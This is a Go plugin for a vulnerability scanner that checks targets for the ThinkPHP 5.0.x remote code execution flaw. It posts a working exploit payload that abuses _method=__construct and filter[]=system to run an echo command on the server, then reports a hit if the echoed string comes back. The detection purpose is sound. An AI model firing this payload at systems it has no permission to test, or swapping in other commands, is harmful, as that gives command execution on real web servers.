package goplugin

import (
	"Yscanner/utils"
	"bytes"
	"fmt"
	"net/http"
	"strings"
)

func init() {
	Register("thinkphp_5023_rce", &thinkphp_5023_rce{})
}

type thinkphp_5023_rce struct{}

func (p *thinkphp_5023_rce) Info() PluginInfo {
	return PluginInfo{
		Name:     "ThinkPHP5 5.0.23 远程代码执行漏洞",
		VulnInfo: "ThinkPHP是一款运用极广的PHP开发框架。其5.0.23以前的版本中，获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。",
		VulnID:   "",
		Level:    "CRITICAL",
		URL:      "",
		Version:  "5.0.0 <= ThinkPHP5 <= 5.0.23",
		CWE:      "",
	}
}

func (p *thinkphp_5023_rce) Check(netloc string) bool {
	rand := utils.GenRandom(10)
	payload := fmt.Sprintf("_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo %s", rand)

	req, err := http.NewRequest("POST", netloc+"/index.php?s=captcha", bytes.NewBufferString(payload))
	if err != nil {
		return false
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := utils.RequestDo(req, true, 2)
	if err != nil {
		return false
	}

	if resp.Other.StatusCode == 200 && strings.Contains(resp.ResponseRaw, rand) {
		return true
	}
	return false
}
